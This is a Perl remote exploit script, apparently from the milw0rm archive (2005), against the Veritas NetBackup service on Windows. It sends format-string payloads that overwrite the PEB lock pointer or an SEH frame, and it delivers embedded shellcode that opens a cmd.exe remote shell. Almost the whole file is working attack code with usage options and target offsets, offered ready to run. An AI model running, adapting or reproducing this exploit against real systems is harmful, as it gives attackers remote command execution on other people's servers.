#!C:\Perl\bin\perl.exe -w
#
# Vertias Netbackup Win32 format string exploit
# Code By: johnh[at]digitalmunition[dot]com & kf[at]digitalmunition[dot]com
#
# For win2k/xp pre sp2 we overwrote PEBFastlock -> rtlentercritical
# For win xp sp2 we overwrote SEH
# http://www.digitalmunition.com/
#
# You may have to run this 2 times. 

use IO::Socket;
use Getopt::Std; getopts('h:p:t:', \ our %args);

if (defined($args{'h'})) { $host   = $args{'h'}; }
if (defined($args{'p'})) { $port   = $args{'p'}; }else{$port = 13722;}
if (defined($args{'t'})) { $target = $args{'t'}; }


print "\n-=[Remote Veritas NetBackup Format String exploit]=-\n\n";
print "\n-=[TagTeam johnh[at]digitalmunition[dot]com and kf_lists[at]digitalmunition[dot]com]=-\n\n";

if(!defined($host)){
print "Usage:
        -h <host>
        -p port <default 13722>
        -t target:
            0 - Windows 2k/Windows XP SP0/SP1 - PEB
            1 - Windows XP SP2 - SEH\n\n";
exit(1);
}



my $sock = new IO::Socket::INET(PeerAddr => $host,PeerPort => $port,Proto    => 'tcp');
$sock or die "no socket :$!";

# 970 chars in length. 








my $shellcode = "\x90"x100;
$shellcode .=
	"\xeb\x42"	.
	"\x56".
	"\x57".	
	"\x8b\x45\x3c".	
	"\x8b\x54\x05\x78".	
	"\x01\xea"	.
	"\x52"	.
	"\x8b\x52\x20".	
	"\x01\xea".	
	"\x31\xc0".	
	"\x31\xc9".	
	"\x41"	.
	"\x8b\x34\x8a".	
	"\x01\xee".	
	"\x31\xff".	
	"\xc1\xcf\x13"	.
	"\xac"	.
	"\x01\xc7".	
	"\x85\xc0".	
	"\x75\xf6".	
	"\x39\xdf".	
	"\x75\xea".	
	"\x5a"	.
	"\x8b\x5a\x24"	.
	"\x01\xeb"	.
	"\x66\x8b\x0c\x4b".	
	"\x8b\x5a\x1c"	.
	"\x01\xeb"	.
	"\x8b\x04\x8b"	.
	"\x01\xe8"	.
	"\x5f"	.
	"\x5e"	.
	"\xc3"	.
	"\xfc"	.
	"\x31\xc0".	
	"\x64\x8b\x40\x30".	
	"\x8d\x78\x20"	.
	"\x8b\x40\x0c"	.
	"\x8b\x70\x1c"	.
	"\xad"	.
	"\x8b\x68\x08".	
	"\x89\xee".	
	"\x31\xc0".	
	"\x64\x8b\x40\x30".	
	"\x8b\x40\x0c"	.
	"\x8b\x40\x1c"	.
	"\x8b\x68\x08"	.
	"\xbb\x6f\x5b\x8b\x9c".	
	"\xe8\x8f\xff\xff\xff".	
	"\xab"	.
	"\xbb\xe1\x0f\xfe\xb7".	
	"\xe8\x84\xff\xff\xff".	
	"\xab"	.
	"\x89\xf5".	
	"\x31\xc0".	
	"\x66\xb8\x6c\x6c".	
	"\x50"	.
	"\x68\x33\x32\x2e\x64".	
	"\x68\x77\x73\x32\x5f".	
	"\x54"	.
	"\xbb\x71\xa7\xe8\xfe"	.
	"\xe8\x65\xff\xff\xff"	.
	"\xff\xd0"	.
	"\x89\xef"	.
	"\x89\xc5"	.
	"\x81\xc4\x70\xfe\xff\xff"	.
	"\x54"	.
	"\x31\xc0".	
	"\xfe\xc4".	
	"\x40"	.
	"\x50"	.
	"\xbb\x22\x7d\xab\x7d".	
	"\xe8\x48\xff\xff\xff".	
	"\xff\xd0"	.
	"\x31\xc0"	.
	"\x50"	.
	"\x50"	.
	"\x50"	.
	"\x50"	.
	"\x40"	.
	"\x50"	.
	"\x40"	.
	"\x50"	.
	"\xbb\xa6\x55\x34\x79".	
	"\xe8\x32\xff\xff\xff".	
	"\xff\xd0"	.
	"\x89\xc6"	.
	"\x31\xc0"	.
	"\x50"	.
	"\x50"	.
	"\x35\x02\x01\x70\xcc".	
	"\xfe\xcc"	.
	"\x50"	.
	"\x89\xe0".	
	"\x50"	.
	"\x6a\x10"	.
	"\x50"	.
	"\x56"	.
	"\xbb\x81\xb4\x2c\xbe"	.
	"\xe8\x11\xff\xff\xff"	.
	"\xff\xd0"	.
	"\x31\xc0"	.
	"\x50"	.
	"\x56"	.
	"\xbb\xd3\xfa\x58\x9b"	.
	"\xe8\x01\xff\xff\xff"	.
	"\xff\xd0"	.
	"\x58"	.
	"\x60"	.
	"\x6a\x10".	
	"\x54"	.
	"\x50"	.
	"\x56"	.
	"\xbb\x47\xf3\x56\xc6".	
	"\xe8\xee\xfe\xff\xff".	
	"\xff\xd0"	.
	"\x89\xc6"	.
	"\x31\xdb"	.
	"\x53"	.
	"\x68\x2e\x63\x6d\x64".	
	"\x89\xe1"	.
	"\x41"	.
	"\x31\xdb".	
	"\x56"	.
	"\x56"	.
	"\x56"	.
	"\x53"	.
	"\x53"	.
	"\x31\xc0".	
	"\xfe\xc4".	
	"\x40"	.
	"\x50"	.
	"\x53"	.
	"\x53"	.
	"\x53"	.
	"\x53"	.
	"\x53"	.
	"\x53"	.
	"\x53"	.
	"\x53"	.
	"\x53"	.
	"\x53"	.
	"\x6a\x44".	
	"\x89\xe0".	
	"\x53"	.
	"\x53"	.
	"\x53"	.
	"\x53"	.
	"\x54"	.
	"\x50"	.
	"\x53"	.
	"\x53"	.
	"\x53"	.
	"\x43"	.
	"\x53"	.
	"\x4b"	.
	"\x53"	.
	"\x53"	.
	"\x51"	.
	"\x53"	.
	"\x87\xfd" .	
	"\xbb\x21\xd0\x05\xd0".	
	"\xe8\xa8\xfe\xff\xff".	
	"\xff\xd0"	.
	"\x5b"	.
	"\x31\xc0".	
	"\x48"	.
	"\x50"	.
	"\x53"	.
	"\xbb\x43\xcb\x8d\x5f".	
	"\xe8\x96\xfe\xff\xff".	
	"\xff\xd0"	.
	"\x56"	.
	"\x87\xef".	
	"\xbb\x12\x6b\x6d\xd0".	
	"\xe8\x87\xfe\xff\xff".	
	"\xff\xd0"	.
	"\x83\xc4\x5c"	.
	"\x61"	.
	"\xeb\x81";


#/*
#7FFDF250    54              PUSH ESP
#7FFDF251    5F              POP EDI
#7FFDF252    B8 90909090     MOV EAX,90909090
#7FFDF257    FD              STD 
#7FFDF258    F2:AF           REPNE SCAS DWORD PTR ES:[EDI]
#7FFDF25A    57              PUSH EDI
#7FFDF25B    C3              RETN
#
#and 
#
#over write FastPebLockRoutine pointer to EnterCriticalSection with our code address of 7FFDF250    
#
#7FFDF020    7FFDF250    
#
#*/

print "TARGET IS $target\n";
if ($target == 0) {
$c = 8;
@fmt_array = (

#WINDOWS 2K SP4/XP SP0-SP1
#OVERWRITE PEB FASTLOCKPOINTER -> RTLEnterCriticalSection
[ 0x7FFDF250, 0x7FFDF252, 0x7FFDF254, 0x7FFDF256, 0x7FFDF258, 0x7FFDF25A, 0x7FFDF022, 0x7FFDF020 ],
[ 0x5f54, 0x90b8, 0x9090, 0xfc90, 0xaff2, 0xc357, 0x7ffd, 0xf250 ],

);
}


if ($target == 1) {
$c = 10;
@fmt_array = (
#windows XP SP2
#OVERWRITE STATIC SEH FRAME

[ 0x7FFDF250, 0x7FFDF252, 0x7FFDF254, 0x7FFDF256, 0x7FFDF258, 0x7FFDF25A, 0x0012ffb0, 0x0012ffb2, 0x0012ffb6, 0x0012ffb4 ],
[ 0x5f54, 0x90b8, 0x9090, 0xfc90, 0xaff2, 0xc357, 0x9090,0x9090,0x7FFD, 0xF250 ],
);
}


my $offset = 0;
my $dump_fmt=6; #amount of %.8x needed to reach stackbase
my $payload; 
my $payload2;
my $hi; 
my $lo;  
my $last = 0;
my $flag = 2; 

my @shift;

for (my $y = 0; $y < $c; $y = $y + 2)
{

$payload = "%08x" x $dump_fmt;
$payload2 = pack('l', $fmt_array[0][$y]) . "AAAA" . pack('l', $fmt_array[0][$y+1]);

$hi = $fmt_array[1][$y] - 0x2a - 35;
$lo = $fmt_array[1][$y+1] - $hi - 77;

$payload .= "%$hi" . "x%hn%$lo" . "x%hn";

print $sock " 118      1\nSNO space filler\n";
print scalar <$sock>;
print scalar <$sock>;

print $sock " 101      6\n" .   
"$payload" . "\n" . # You must finish the line off with a line feed. 
"dummy space\n" . 
"$shellcode\n" . 
"$payload2" . "\n" . 
"spare bits\n" . 
"spare bits\n\n";


print scalar <$sock>;
print scalar <$sock>;

}


if ($target == 1)
{
#create exception so SEH is called
print $sock " 118      1\nSNO space filler\n";
print scalar <$sock>;
print scalar <$sock>;

print $sock " 101      6\n" .   
"%n" . "\n" . # You must finish the line off with a line feed. 
"dummy space\n" . 
"$shellcode\n" . 
"AAAAAAAAAAAA" . "\n" . 
"spare bits\n" . 
"spare bits\n\n";


print scalar <$sock>;
print scalar <$sock>;

}


close $sock;

# milw0rm.com [2005-10-20]
